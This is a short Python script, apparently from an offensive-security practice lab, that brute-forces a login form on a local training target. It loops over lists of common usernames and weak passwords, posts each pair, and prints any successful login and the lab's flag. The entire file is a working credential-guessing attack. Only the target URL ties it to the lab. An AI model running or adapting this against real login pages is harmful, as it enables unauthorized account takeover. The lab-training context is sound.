#!/usr/bin/env python3
"""
Offensive Security Practice Tool 3: Automated HTTP Login Brute-Forcer
Tests credentials against Lab 01 (SQL Injection target login form)
Usage: python brute_force_login.py
"""

import sys
import requests

TARGET_URL = "http://127.0.0.1:8888/Lab_01_SQL_Injection/index.php"

USERNAMES = ["admin", "root", "administrator", "john", "alice"]
PASSWORDS = [
    "123456", "password", "admin", "welcome", "letmein", "12345678",
    "SuperSecretAdminP@ss2026!", "password123", "Wonderland99!"
]

def attack():
    print(f"[*] Starting Dictionary Attack on: {TARGET_URL}")
    print(f"[*] Testing {len(USERNAMES)} usernames against {len(PASSWORDS)} passwords ({len(USERNAMES)*len(PASSWORDS)} combinations)...")
    print("-" * 65)

    session = requests.Session()

    for user in USERNAMES:
        for pwd in PASSWORDS:
            data = {
                'action': 'login',
                'username': user,
                'password': pwd
            }
            try:
                r = session.post(TARGET_URL, data=data, timeout=3)
                if "Access Granted!" in r.text or "FLAG{" in r.text:
                    print(f"\033[92m[+] SUCCESSFUL LOGIN!\033[0m User: \033[1m{user}\033[0m | Password: \033[1m{pwd}\033[0m")
                    # Extract flag
                    for line in r.text.split("\n"):
                        if "FLAG{" in line:
                            print(f"    Secret: {line.strip()}")
            except requests.RequestException as e:
                print(f"[!] Request error: {e}")
                sys.exit(1)

    print("-" * 65)
    print("[*] Brute force attack finished.")

if __name__ == "__main__":
    attack()
